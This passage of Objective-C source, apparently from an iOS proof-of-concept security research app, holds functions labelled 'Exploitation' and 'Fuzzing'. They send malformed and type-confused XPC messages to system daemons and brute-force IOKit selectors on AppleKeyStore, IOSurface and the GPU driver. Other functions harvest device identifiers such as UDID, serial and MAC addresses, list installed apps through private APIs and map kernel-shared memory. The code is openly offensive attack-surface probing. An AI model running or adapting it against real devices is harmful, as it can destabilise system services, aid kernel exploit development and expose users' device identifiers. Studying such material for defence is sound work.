    for (NSString *serviceName in xpcServices) {
        xpc_connection_t conn = _xpc_connection_create_mach_service(
            [serviceName UTF8String],
            NULL,
            0
        );

        if (conn) {
            __block BOOL gotResponse = NO;
            __block NSString *status = @"created";

            _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
                if (event == _XPC_ERROR_CONNECTION_INVALID) {
                    status = @"invalid";
                } else if (event == _XPC_ERROR_CONNECTION_INTERRUPTED) {
                    status = @"interrupted";
                } else {
                    gotResponse = YES;
                }
            });

            _xpc_connection_resume(conn);

            // Send a ping message
            xpc_object_t msg = _xpc_dictionary_create(NULL, NULL, 0);
            _xpc_dictionary_set_string(msg, "ping", "test");

            _xpc_connection_send_message_with_reply(conn, msg, dispatch_get_main_queue(), ^(xpc_object_t reply) {
                if (_xpc_get_type(reply) != _XPC_TYPE_ERROR) {
                    gotResponse = YES;
                }
            });

            // Brief wait
            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];

            if (gotResponse) {
                [log appendFormat:@"[!] %@ - RESPONDED\n", serviceName];
            } else {
                [log appendFormat:@"[+] %@ - %@\n", serviceName, status];
            }

            _xpc_connection_cancel(conn);
        } else {
            [log appendFormat:@"[-] %@ - unavailable\n", serviceName];
        }
    }

    [log appendString:@"\n[*] XPC service scan complete\n"];
    return log;
}

#pragma mark - IOKit Advanced Exploitation

+ (NSString *)runIOKitAdvancedExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== IOKit Advanced Exploitation ===\n\n"];

    mach_port_t masterPort = kIOMainPortDefault;

    // AppleKeyStore probing
    [log appendString:@"[*] Probing AppleKeyStore...\n"];
    io_service_t keystore = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));
    if (keystore != IO_OBJECT_NULL) {
        [log appendFormat:@"[+] Found AppleKeyStore: 0x%x\n", keystore];

        io_connect_t conn;
        kern_return_t kr = IOServiceOpen(keystore, mach_task_self(), 0, &conn);
        if (kr == KERN_SUCCESS) {
            [log appendFormat:@"[!] Opened AppleKeyStore connection: 0x%x\n", conn];

            // Try external methods (selector probing)
            uint64_t input[16] = {0};
            uint64_t output[16] = {0};
            uint32_t outputCnt = 16;

            for (uint32_t selector = 0; selector < 20; selector++) {
                kr = IOConnectCallMethod(conn, selector, input, 1, NULL, 0, output, &outputCnt, NULL, NULL);
                if (kr != 0xe00002c2) { // kIOReturnBadArgument
                    [log appendFormat:@"    Selector %u: 0x%x\n", selector, kr];
                }
            }
            IOServiceClose(conn);
        } else {
            [log appendFormat:@"[-] Cannot open AppleKeyStore: 0x%x\n", kr];
        }
        IOObjectRelease(keystore);
    } else {
        [log appendString:@"[-] AppleKeyStore not found\n"];
    }

    // IOSurface probing
    [log appendString:@"\n[*] Probing IOSurfaceRoot...\n"];
    io_service_t surfaceRoot = IOServiceGetMatchingService(masterPort, IOServiceMatching("IOSurfaceRoot"));
    if (surfaceRoot != IO_OBJECT_NULL) {
        [log appendFormat:@"[+] Found IOSurfaceRoot: 0x%x\n", surfaceRoot];

        io_connect_t conn;
        kern_return_t kr = IOServiceOpen(surfaceRoot, mach_task_self(), 0, &conn);
        if (kr == KERN_SUCCESS) {
            [log appendFormat:@"[!] Opened IOSurfaceRoot connection: 0x%x\n", conn];

            // Enumerate selectors
            uint64_t scalarIn[8] = {0};
            uint64_t scalarOut[8] = {0};
            uint32_t scalarOutCnt = 8;

            for (uint32_t sel = 0; sel < 15; sel++) {
                kr = IOConnectCallScalarMethod(conn, sel, scalarIn, 0, scalarOut, &scalarOutCnt);
                if (kr != 0xe00002c2 && kr != 0xe00002bc) {
                    [log appendFormat:@"    Selector %u: 0x%x (out[0]=0x%llx)\n", sel, kr, scalarOut[0]];
                }
                scalarOutCnt = 8;
            }
            IOServiceClose(conn);
        } else {
            [log appendFormat:@"[-] Cannot open IOSurfaceRoot: 0x%x\n", kr];
        }
        IOObjectRelease(surfaceRoot);
    }

    // AppleJPEGDriver probing
    [log appendString:@"\n[*] Probing AppleJPEGDriver...\n"];
    io_service_t jpegDriver = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleJPEGDriver"));
    if (jpegDriver != IO_OBJECT_NULL) {
        [log appendFormat:@"[+] Found AppleJPEGDriver: 0x%x\n", jpegDriver];

        io_connect_t conn;
        kern_return_t kr = IOServiceOpen(jpegDriver, mach_task_self(), 0, &conn);
        if (kr == KERN_SUCCESS) {
            [log appendFormat:@"[!] Opened AppleJPEGDriver: 0x%x\n", conn];
            IOServiceClose(conn);
        } else {
            [log appendFormat:@"[-] Cannot open: 0x%x\n", kr];
        }
        IOObjectRelease(jpegDriver);
    } else {
        [log appendString:@"[-] AppleJPEGDriver not found\n"];
    }

    // AGXAccelerator (GPU)
    [log appendString:@"\n[*] Probing AGXAccelerator...\n"];
    io_service_t agx = IOServiceGetMatchingService(masterPort, IOServiceMatching("AGXAccelerator"));
    if (agx != IO_OBJECT_NULL) {
        [log appendFormat:@"[+] Found AGXAccelerator: 0x%x\n", agx];

        // Try different user client types
        for (uint32_t type = 0; type < 5; type++) {
            io_connect_t conn;
            kern_return_t kr = IOServiceOpen(agx, mach_task_self(), type, &conn);
            if (kr == KERN_SUCCESS) {
                [log appendFormat:@"[!] Opened type %u: 0x%x\n", type, conn];
                IOServiceClose(conn);
            }
        }
        IOObjectRelease(agx);
    }

    [log appendString:@"\n[*] IOKit advanced exploitation complete\n"];
    return log;
}

#pragma mark - XPC Message Fuzzing

+ (NSString *)runXPCFuzzing {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== XPC Message Fuzzing ===\n\n"];

    load_xpc_symbols();
    if (!xpc_loaded) {
        [log appendString:@"[-] XPC symbols not available\n"];
        return log;
    }

    // Services to fuzz
    NSArray *targets = @[
        @"com.apple.cfprefsd.agent",
        @"com.apple.lsd.mapdb",
        @"com.apple.coreservices.launchservicesd"
    ];

    for (NSString *service in targets) {
        [log appendFormat:@"\n[*] Fuzzing %@...\n", service];

        xpc_connection_t conn = _xpc_connection_create_mach_service(
            [service UTF8String], NULL, 0);

        if (!conn) {
            [log appendFormat:@"[-] Cannot connect\n"];
            continue;
        }

        __block int responses = 0;
        _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
            responses++;
        });
        _xpc_connection_resume(conn);

        // Test 1: Empty message
        xpc_object_t msg1 = _xpc_dictionary_create(NULL, NULL, 0);
        _xpc_connection_send_message(conn, msg1);
        [log appendString:@"    [+] Sent empty message\n"];

        // Test 2: Large key
        xpc_object_t msg2 = _xpc_dictionary_create(NULL, NULL, 0);
        char largeKey[1024];
        memset(largeKey, 'A', 1023);
        largeKey[1023] = 0;
        _xpc_dictionary_set_string(msg2, largeKey, "test");
        _xpc_connection_send_message(conn, msg2);
        [log appendString:@"    [+] Sent large key message\n"];

        // Test 3: Type confusion - set int where string expected
        xpc_object_t msg3 = _xpc_dictionary_create(NULL, NULL, 0);
        _xpc_dictionary_set_int64(msg3, "path", 0x4141414141414141);
        _xpc_dictionary_set_int64(msg3, "command", -1);
        _xpc_connection_send_message(conn, msg3);
        [log appendString:@"    [+] Sent type confusion message\n"];

        // Test 4: Nested arrays
        xpc_object_t msg4 = _xpc_dictionary_create(NULL, NULL, 0);
        xpc_object_t arr = _xpc_array_create(NULL, 0);
        for (int i = 0; i < 100; i++) {
            xpc_object_t inner = _xpc_dictionary_create(NULL, NULL, 0);
            _xpc_dictionary_set_int64(inner, "idx", i);
            _xpc_array_append_value(arr, inner);
        }
        _xpc_dictionary_set_value(msg4, "items", arr);
        _xpc_connection_send_message(conn, msg4);
        [log appendString:@"    [+] Sent nested array message\n"];

        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.3]];
        [log appendFormat:@"    Responses: %d\n", responses];

        _xpc_connection_cancel(conn);
    }

    [log appendString:@"\n[*] XPC fuzzing complete\n"];
    return log;
}

#pragma mark - MobileGestalt Queries

+ (NSString *)runMobileGestaltQueries {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== MobileGestalt Queries ===\n\n"];

    // Load MobileGestalt
    void *handle = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW);
    if (!handle) {
        [log appendFormat:@"[-] Cannot load MobileGestalt: %s\n", dlerror()];
        return log;
    }

    // Get MGCopyAnswer
    CFTypeRef (*MGCopyAnswer)(CFStringRef) = dlsym(handle, "MGCopyAnswer");
    if (!MGCopyAnswer) {
        [log appendString:@"[-] MGCopyAnswer not found\n"];
        dlclose(handle);
        return log;
    }

    [log appendString:@"[+] MobileGestalt loaded\n\n"];

    // Interesting keys to query
    NSArray *keys = @[
        @"UniqueDeviceID",
        @"SerialNumber",
        @"ProductType",
        @"HardwareModel",
        @"BuildVersion",
        @"ProductVersion",
        @"DeviceName",
        @"UserAssignedDeviceName",
        @"MLBSerialNumber",
        @"UniqueChipID",
        @"DieId",
        @"CPUArchitecture",
        @"DeviceClass",
        @"ChipID",
        @"BoardId",
        @"WifiAddress",
        @"BluetoothAddress",
        @"EthernetMacAddress",
        @"FirmwareVersion",
        @"BasebandSerialNumber",
        @"BasebandChipId",
        @"CarrierBundleInfoArray",
        @"RegionalBehaviorNTSC",
        @"SIMTrayStatus",
        @"InternalBuild",
        @"DeviceSupportsApplePay",
        @"HasSEP",
        @"SEPNonce",
        @"PasswordProtected",
        @"DeviceEnclosureColor",
        @"ArtworkDeviceIdiom",
        @"DeviceSupportsFaceTime",
        @"DeviceSupports1080p",
        @"DeviceSupports720p"
    ];

    for (NSString *key in keys) {
        CFTypeRef value = MGCopyAnswer((__bridge CFStringRef)key);
        if (value) {
            NSString *desc = [(__bridge id)value description];
            if (desc.length > 50) {
                desc = [[desc substringToIndex:47] stringByAppendingString:@"..."];
            }
            [log appendFormat:@"[+] %@: %@\n", key, desc];
            CFRelease(value);
        } else {
            [log appendFormat:@"[-] %@: (null)\n", key];
        }
    }

    dlclose(handle);
    [log appendString:@"\n[*] MobileGestalt queries complete\n"];
    return log;
}

#pragma mark - SpringBoard Interaction

+ (NSString *)runSpringBoardInteraction {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== SpringBoard Interaction ===\n\n"];

    // Load SpringBoardServices
    void *sbsHandle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    if (!sbsHandle) {
        [log appendFormat:@"[-] Cannot load SpringBoardServices: %s\n", dlerror()];
    } else {
        [log appendString:@"[+] SpringBoardServices loaded\n"];

        // Try to get display identifiers
        CFArrayRef (*SBSCopyApplicationDisplayIdentifiers)(BOOL, BOOL) =
            dlsym(sbsHandle, "SBSCopyApplicationDisplayIdentifiers");
        if (SBSCopyApplicationDisplayIdentifiers) {
            CFArrayRef apps = SBSCopyApplicationDisplayIdentifiers(NO, NO);
            if (apps) {
                [log appendFormat:@"[+] Found %ld installed apps\n", CFArrayGetCount(apps)];
                NSArray *appList = (__bridge NSArray *)apps;
                for (int i = 0; i < MIN(10, (int)appList.count); i++) {
                    [log appendFormat:@"    - %@\n", appList[i]];
                }
                if (appList.count > 10) {
                    [log appendFormat:@"    ... and %lu more\n", (unsigned long)(appList.count - 10)];
                }
                CFRelease(apps);
            }
        }

        // Get front app
        mach_port_t (*SBSSpringBoardServerPort)(void) = dlsym(sbsHandle, "SBSSpringBoardServerPort");
        if (SBSSpringBoardServerPort) {
            mach_port_t port = SBSSpringBoardServerPort();
            [log appendFormat:@"[+] SpringBoard port: 0x%x\n", port];
        }

        dlclose(sbsHandle);
    }

    // Load FrontBoardServices
    [log appendString:@"\n[*] Trying FrontBoardServices...\n"];
    void *fbsHandle = dlopen("/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices", RTLD_NOW);
    if (fbsHandle) {
        [log appendString:@"[+] FrontBoardServices loaded\n"];

        // Try to get FBSSystemService
        Class FBSSystemService = NSClassFromString(@"FBSSystemService");
        if (FBSSystemService) {
            [log appendString:@"[+] Found FBSSystemService class\n"];

            // List methods
            unsigned int count;
            Method *methods = class_copyMethodList(FBSSystemService, &count);
            [log appendFormat:@"    Methods: %u\n", count];
            for (unsigned int i = 0; i < MIN(10, count); i++) {
                SEL sel = method_getName(methods[i]);
                [log appendFormat:@"    - %@\n", NSStringFromSelector(sel)];
            }
            free(methods);
        }

        dlclose(fbsHandle);
    }

    // Check LSApplicationProxy
    [log appendString:@"\n[*] Querying LSApplicationProxy...\n"];
    Class LSApplicationProxy = NSClassFromString(@"LSApplicationProxy");
    if (LSApplicationProxy) {
        SEL selector = NSSelectorFromString(@"applicationProxyForIdentifier:");
        if ([LSApplicationProxy respondsToSelector:selector]) {
            // Get info about common apps
            NSArray *bundleIDs = @[@"com.apple.mobilesafari", @"com.apple.Preferences", @"com.apple.AppStore"];
            for (NSString *bundleID in bundleIDs) {
                id proxy = [LSApplicationProxy performSelector:selector withObject:bundleID];
                if (proxy) {
                    [log appendFormat:@"[+] %@: found\n", bundleID];
                    SEL localizedName = NSSelectorFromString(@"localizedName");
                    if ([proxy respondsToSelector:localizedName]) {
                        NSString *name = [proxy performSelector:localizedName];
                        [log appendFormat:@"    Name: %@\n", name];
                    }
                }
            }
        }
    }

    [log appendString:@"\n[*] SpringBoard interaction complete\n"];
    return log;
}

#pragma mark - Entitlement Probing

+ (NSString *)runEntitlementProbing {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Entitlement Probing ===\n\n"];

    // Test operations that typically require entitlements
    [log appendString:@"[*] Testing privileged operations...\n\n"];

    // Test 1: Keychain access
    [log appendString:@"[1] Keychain access:\n"];
    NSDictionary *keychainQuery = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: @"com.poc.test",
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
    };
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)keychainQuery, &result);
    [log appendFormat:@"    SecItemCopyMatching: %d\n", (int)status];

    // Test 2: Location services
    [log appendString:@"\n[2] Location services:\n"];
    Class CLLocationManager = NSClassFromString(@"CLLocationManager");
    if (CLLocationManager) {
        SEL authStatus = NSSelectorFromString(@"authorizationStatus");
        if ([CLLocationManager respondsToSelector:authStatus]) {
            NSInteger authStat = (NSInteger)[CLLocationManager performSelector:authStatus];
            [log appendFormat:@"    Authorization status: %ld\n", (long)authStat];
        }
    }

    // Test 3: Address book access
    [log appendString:@"\n[3] Contacts access:\n"];
    void *abHandle = dlopen("/System/Library/Frameworks/Contacts.framework/Contacts", RTLD_NOW);
    if (abHandle) {
        Class CNContactStore = NSClassFromString(@"CNContactStore");
        if (CNContactStore) {
            SEL authForType = NSSelectorFromString(@"authorizationStatusForEntityType:");
            if ([CNContactStore respondsToSelector:authForType]) {
                // CNEntityTypeContacts = 0
                NSInteger contactsAuth = ((NSInteger (*)(id, SEL, NSInteger))objc_msgSend)(CNContactStore, authForType, 0);
                [log appendFormat:@"    Contacts auth: %ld\n", (long)contactsAuth];
            }
        }
        dlclose(abHandle);
    }

    // Test 4: Camera access
    [log appendString:@"\n[4] Camera access:\n"];
    Class AVCaptureDevice = NSClassFromString(@"AVCaptureDevice");
    if (AVCaptureDevice) {
        SEL authForMedia = NSSelectorFromString(@"authorizationStatusForMediaType:");
        if ([AVCaptureDevice respondsToSelector:authForMedia]) {
            NSInteger videoAuth = ((NSInteger (*)(id, SEL, id))objc_msgSend)(AVCaptureDevice, authForMedia, @"vide");
            [log appendFormat:@"    Video auth: %ld\n", (long)videoAuth];
        }
    }

    // Test 5: Background modes
    [log appendString:@"\n[5] Background modes:\n"];
    NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
    NSArray *bgModes = infoPlist[@"UIBackgroundModes"];
    [log appendFormat:@"    Declared modes: %@\n", bgModes ?: @"none"];

    // Test 6: App groups
    [log appendString:@"\n[6] App groups:\n"];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *testGroups = @[@"group.com.apple.test", @"group.com.test.shared"];
    for (NSString *group in testGroups) {
        NSURL *url = [fm containerURLForSecurityApplicationGroupIdentifier:group];
        if (url) {
            [log appendFormat:@"    [!] %@: accessible\n", group];
        } else {
            [log appendFormat:@"    [-] %@: not accessible\n", group];
        }
    }

    // Test 7: URL schemes
    [log appendString:@"\n[7] URL scheme access:\n"];
    NSArray *schemes = @[@"tel://", @"sms://", @"mailto://", @"facetime://", @"prefs://"];
    for (NSString *scheme in schemes) {
        NSURL *url = [NSURL URLWithString:[scheme stringByAppendingString:@"test"]];
        BOOL canOpen = [[UIApplication sharedApplication] canOpenURL:url];
        [log appendFormat:@"    %@ %@\n", scheme, canOpen ? @"YES" : @"NO"];
    }

    // Test 8: Network extension
    [log appendString:@"\n[8] Network extension:\n"];
    void *neHandle = dlopen("/System/Library/Frameworks/NetworkExtension.framework/NetworkExtension", RTLD_NOW);
    if (neHandle) {
        Class NEVPNManager = NSClassFromString(@"NEVPNManager");
        if (NEVPNManager) {
            [log appendString:@"    NEVPNManager available\n"];
            SEL sharedManager = NSSelectorFromString(@"sharedManager");
            if ([NEVPNManager respondsToSelector:sharedManager]) {
                id mgr = [NEVPNManager performSelector:sharedManager];
                [log appendFormat:@"    Shared manager: %@\n", mgr ? @"obtained" : @"nil"];
            }
        }
        dlclose(neHandle);
    }

    [log appendString:@"\n[*] Entitlement probing complete\n"];
    return log;
}

#pragma mark - AGX Deep Probing

+ (NSString *)runAGXDeepProbe {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== AGXAccelerator Deep Probing ===\n\n"];

    mach_port_t masterPort = kIOMainPortDefault;

    // Find AGX family services
    NSArray *agxServices = @[
        @"AGXAccelerator",
        @"AGXAcceleratorG13G",
        @"AGXAcceleratorG14P",
        @"IOGPU",
        @"IOGPUDevice"
    ];

    for (NSString *serviceName in agxServices) {
        io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching([serviceName UTF8String]));
        if (service == IO_OBJECT_NULL) continue;

        [log appendFormat:@"[+] Found %@: 0x%x\n", serviceName, service];

        // Try multiple user client types
        for (uint32_t clientType = 0; clientType < 8; clientType++) {
            io_connect_t conn;
            kern_return_t kr = IOServiceOpen(service, mach_task_self(), clientType, &conn);
            if (kr != KERN_SUCCESS) continue;

            [log appendFormat:@"\n[!] Opened %@ type %u: 0x%x\n", serviceName, clientType, conn];

            // Enumerate external methods
            [log appendString:@"    Probing external methods:\n"];

            for (uint32_t selector = 0; selector < 100; selector++) {
                uint64_t scalarIn[16] = {0};
                uint64_t scalarOut[16] = {0};
                uint32_t scalarOutCnt = 16;
                size_t structOutSize = 0;

                kr = IOConnectCallMethod(conn, selector,
                    scalarIn, 0, NULL, 0,
                    scalarOut, &scalarOutCnt, NULL, &structOutSize);

                // Skip common error codes
                if (kr == 0xe00002c2 || kr == 0xe00002bc) continue; // BadArgument, Unsupported

                [log appendFormat:@"    [%u] 0x%x", selector, kr];
                if (kr == KERN_SUCCESS) {
                    [log appendString:@" SUCCESS"];
                    if (scalarOutCnt > 0) {
                        [log appendFormat:@" out[0]=0x%llx", scalarOut[0]];
                    }
                }
                [log appendString:@"\n"];
            }

            // Try structured input
            [log appendString:@"\n    Testing structured input:\n"];
            char structIn[256] = {0};
            char structOut[256] = {0};
            size_t structOutLen = sizeof(structOut);

            // Fill with pattern
            memset(structIn, 0x41, sizeof(structIn));

            for (uint32_t sel = 0; sel < 20; sel++) {
                structOutLen = sizeof(structOut);
                kr = IOConnectCallMethod(conn, sel,
                    NULL, 0, structIn, sizeof(structIn),
                    NULL, NULL, structOut, &structOutLen);

                if (kr != 0xe00002c2 && kr != 0xe00002bc) {
                    [log appendFormat:@"    Struct[%u]: 0x%x (outLen=%zu)\n", sel, kr, structOutLen];
                }
            }

            IOServiceClose(conn);
        }
        IOObjectRelease(service);
    }

    [log appendString:@"\n[*] AGX deep probe complete\n"];
    return log;
}

#pragma mark - AppleKeyStore Exploitation

+ (NSString *)runAppleKeyStoreExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== AppleKeyStore Exploitation ===\n\n"];

    mach_port_t masterPort = kIOMainPortDefault;
    io_service_t keystore = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));

    if (keystore == IO_OBJECT_NULL) {
        [log appendString:@"[-] AppleKeyStore not found\n"];
        return log;
    }

    [log appendFormat:@"[+] Found AppleKeyStore: 0x%x\n", keystore];

    io_connect_t conn;
    kern_return_t kr = IOServiceOpen(keystore, mach_task_self(), 0, &conn);

    if (kr != KERN_SUCCESS) {
        [log appendFormat:@"[-] Cannot open: 0x%x\n", kr];
        IOObjectRelease(keystore);
        return log;
    }

    [log appendFormat:@"[!] Opened connection: 0x%x\n\n", conn];

    // Known AppleKeyStore selectors
    // 0: getSystemKeyUID, 1: getPasscodeGeneration, 16: getKeyGeneration
    // 17: registerDevice, 20-25: various key operations

    [log appendString:@"[*] Testing known selectors...\n"];

    // Selector 0: getSystemKeyUID
    {
        uint64_t out[4] = {0};
        uint32_t outCnt = 4;
        kr = IOConnectCallScalarMethod(conn, 0, NULL, 0, out, &outCnt);
        [log appendFormat:@"    [0] getSystemKeyUID: 0x%x", kr];
        if (kr == KERN_SUCCESS && outCnt > 0) {
            [log appendFormat:@" = 0x%llx", out[0]];
        }
        [log appendString:@"\n"];
    }

    // Selector 1: getPasscodeGeneration
    {
        uint64_t out[4] = {0};
        uint32_t outCnt = 4;
        kr = IOConnectCallScalarMethod(conn, 1, NULL, 0, out, &outCnt);
        [log appendFormat:@"    [1] getPasscodeGen: 0x%x", kr];
        if (kr == KERN_SUCCESS && outCnt > 0) {
            [log appendFormat:@" = %lld", out[0]];
        }
        [log appendString:@"\n"];
    }

    // Selector 16: getKeyGeneration
    {
        uint64_t in[1] = {0}; // keyClass
        uint64_t out[4] = {0};
        uint32_t outCnt = 4;
        kr = IOConnectCallScalarMethod(conn, 16, in, 1, out, &outCnt);
        [log appendFormat:@"    [16] getKeyGen: 0x%x", kr];
        if (kr == KERN_SUCCESS && outCnt > 0) {
            [log appendFormat:@" = %lld", out[0]];
        }
        [log appendString:@"\n"];
    }

    // Test structured methods for key operations
    [log appendString:@"\n[*] Testing structured key operations...\n"];

    // Try creating a key bag query
    struct __attribute__((packed)) {
        uint32_t version;
        uint32_t type;
        uint8_t uuid[16];
    } keybagQuery = {0};

    keybagQuery.version = 1;
    keybagQuery.type = 0; // System keybag

    char outBuf[1024] = {0};
    size_t outLen = sizeof(outBuf);

    kr = IOConnectCallMethod(conn, 3, // getPersonalizedKeybag
        NULL, 0, &keybagQuery, sizeof(keybagQuery),
        NULL, NULL, outBuf, &outLen);
    [log appendFormat:@"    [3] getKeybag: 0x%x (outLen=%zu)\n", kr, outLen];

    // Probe all selectors with different input sizes
    [log appendString:@"\n[*] Full selector enumeration...\n"];

    for (uint32_t sel = 0; sel < 50; sel++) {
        uint64_t scalarIn[8] = {0, 0, 0, 0, 0, 0, 0, 0};
        uint64_t scalarOut[8] = {0};
        uint32_t outCnt = 8;

        kr = IOConnectCallScalarMethod(conn, sel, scalarIn, 1, scalarOut, &outCnt);
        if (kr != 0xe00002c2 && kr != 0xe00002bc && kr != 0xe00002c7) {
            [log appendFormat:@"    [%u] 0x%x", sel, kr];
            if (kr == KERN_SUCCESS && outCnt > 0) {
                [log appendFormat:@" out=0x%llx", scalarOut[0]];
            }
            [log appendString:@"\n"];
        }
    }

    IOServiceClose(conn);
    IOObjectRelease(keystore);

    [log appendString:@"\n[*] AppleKeyStore exploitation complete\n"];
    return log;
}

#pragma mark - FBSystemService Invocation

+ (NSString *)runFBSystemServiceInvoke {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== FBSystemService Invocation ===\n\n"];

    // Load FrontBoardServices
    void *fbsHandle = dlopen("/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices", RTLD_NOW);
    if (!fbsHandle) {
        [log appendFormat:@"[-] Cannot load FrontBoardServices: %s\n", dlerror()];
        return log;
    }

    [log appendString:@"[+] FrontBoardServices loaded\n"];

    // Get FBSSystemService
    Class FBSSystemService = NSClassFromString(@"FBSSystemService");
    if (!FBSSystemService) {
        [log appendString:@"[-] FBSSystemService class not found\n"];
        dlclose(fbsHandle);
        return log;
    }

    [log appendString:@"[+] Found FBSSystemService\n"];

    // Get shared service
    SEL sharedServiceSel = NSSelectorFromString(@"sharedService");
    if (![FBSSystemService respondsToSelector:sharedServiceSel]) {
        [log appendString:@"[-] sharedService not available\n"];
        dlclose(fbsHandle);
        return log;
    }

    id service = [FBSSystemService performSelector:sharedServiceSel];
    if (!service) {
        [log appendString:@"[-] Failed to get shared service\n"];
        dlclose(fbsHandle);
        return log;
    }

    [log appendFormat:@"[!] Got FBSSystemService instance: %@\n\n", service];

    // List all methods
    unsigned int methodCount = 0;
    Method *methods = class_copyMethodList([service class], &methodCount);
    [log appendFormat:@"[*] Available methods (%u):\n", methodCount];

    NSMutableArray *interestingMethods = [NSMutableArray array];
    for (unsigned int i = 0; i < methodCount; i++) {
        SEL sel = method_getName(methods[i]);
        NSString *name = NSStringFromSelector(sel);
        [log appendFormat:@"    %@\n", name];

        // Collect interesting methods
        if ([name containsString:@"pid"] || [name containsString:@"application"] ||
            [name containsString:@"open"] || [name containsString:@"terminate"]) {
            [interestingMethods addObject:name];
        }
    }
    free(methods);

    // Try to invoke safe methods
    [log appendString:@"\n[*] Attempting method invocations...\n"];

    // pidForApplication:
    SEL pidForApp = NSSelectorFromString(@"pidForApplication:");
    if ([service respondsToSelector:pidForApp]) {
        NSArray *testApps = @[@"com.apple.springboard", @"com.apple.mobilesafari", @"com.apple.Preferences"];
        for (NSString *app in testApps) {
            pid_t pid = ((pid_t (*)(id, SEL, id))objc_msgSend)(service, pidForApp, app);
            [log appendFormat:@"    pidForApplication:%@ = %d\n", app, pid];
        }
    }

    // clientCallbackQueue
    SEL callbackQueue = NSSelectorFromString(@"clientCallbackQueue");
    if ([service respondsToSelector:callbackQueue]) {
        id queue = [service performSelector:callbackQueue];
        [log appendFormat:@"    clientCallbackQueue = %@\n", queue];
    }

    // systemApplicationBundleID
    SEL sysBundleID = NSSelectorFromString(@"systemApplicationBundleID");
    if ([service respondsToSelector:sysBundleID]) {
        id bundleID = [service performSelector:sysBundleID];
        [log appendFormat:@"    systemApplicationBundleID = %@\n", bundleID];
    }

    dlclose(fbsHandle);
    [log appendString:@"\n[*] FBSystemService invocation complete\n"];
    return log;
}

#pragma mark - IOSurface Memory Operations

+ (NSString *)runIOSurfaceMemoryOps {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== IOSurface Memory Operations ===\n\n"];

    mach_port_t masterPort = kIOMainPortDefault;
    io_service_t surfaceRoot = IOServiceGetMatchingService(masterPort, IOServiceMatching("IOSurfaceRoot"));

    if (surfaceRoot == IO_OBJECT_NULL) {
        [log appendString:@"[-] IOSurfaceRoot not found\n"];
        return log;
    }

    [log appendFormat:@"[+] Found IOSurfaceRoot: 0x%x\n", surfaceRoot];

    io_connect_t conn;
    kern_return_t kr = IOServiceOpen(surfaceRoot, mach_task_self(), 0, &conn);

    if (kr != KERN_SUCCESS) {
        [log appendFormat:@"[-] Cannot open: 0x%x\n", kr];
        IOObjectRelease(surfaceRoot);
        return log;
    }

    [log appendFormat:@"[!] Opened connection: 0x%x\n\n", conn];

    // Create an IOSurface
    [log appendString:@"[*] Creating IOSurface...\n"];

    // IOSurface creation properties
    struct __attribute__((packed)) {
        uint32_t width;
        uint32_t height;
        uint32_t pixelFormat;
        uint32_t bytesPerElement;
        uint32_t bytesPerRow;
        uint32_t allocSize;
    } surfaceProps = {
        .width = 64,
        .height = 64,
        .pixelFormat = 0x42475241, // 'BGRA'
        .bytesPerElement = 4,
        .bytesPerRow = 64 * 4,
        .allocSize = 64 * 64 * 4
    };

    uint64_t surfaceID = 0;
    uint32_t outCnt = 1;

    // Selector 0: s_create_surface
    kr = IOConnectCallMethod(conn, 0,
        NULL, 0, &surfaceProps, sizeof(surfaceProps),
        &surfaceID, &outCnt, NULL, NULL);

    if (kr == KERN_SUCCESS && surfaceID != 0) {
        [log appendFormat:@"[!] Created surface ID: 0x%llx\n", surfaceID];

        // Try to get surface info
        char infoOut[256] = {0};
        size_t infoLen = sizeof(infoOut);
        uint64_t idIn = surfaceID;

        // Selector 1: s_lookup_surface
        kr = IOConnectCallMethod(conn, 1,
            &idIn, 1, NULL, 0,
            NULL, NULL, infoOut, &infoLen);
        [log appendFormat:@"    Lookup: 0x%x (len=%zu)\n", kr, infoLen];

        // Selector 6: s_get_ycbcr_matrix
        kr = IOConnectCallScalarMethod(conn, 6, &idIn, 1, NULL, NULL);
        [log appendFormat:@"    GetMatrix: 0x%x\n", kr];

        // Try mapping surface
        [log appendString:@"\n[*] Testing memory mapping...\n"];

        mach_vm_address_t address = 0;
        mach_vm_size_t size = 0;

        // Selector 10: s_map
        kr = IOConnectMapMemory64(conn, surfaceID, mach_task_self(),
            &address, &size, kIOMapAnywhere);
        if (kr == KERN_SUCCESS) {
            [log appendFormat:@"[!] Mapped at 0x%llx (size: 0x%llx)\n", address, size];

            // Write test pattern
            if (address != 0) {
                memset((void *)address, 0x42, MIN(256, size));
                [log appendString:@"    Wrote test pattern\n"];
                IOConnectUnmapMemory64(conn, surfaceID, mach_task_self(), address);
            }
        } else {
            [log appendFormat:@"[-] Map failed: 0x%x\n", kr];
        }

        // Release surface
        kr = IOConnectCallScalarMethod(conn, 2, &surfaceID, 1, NULL, NULL);
        [log appendFormat:@"    Release: 0x%x\n", kr];

    } else {
        [log appendFormat:@"[-] Surface creation failed: 0x%x\n", kr];
    }

    // Enumerate all selectors
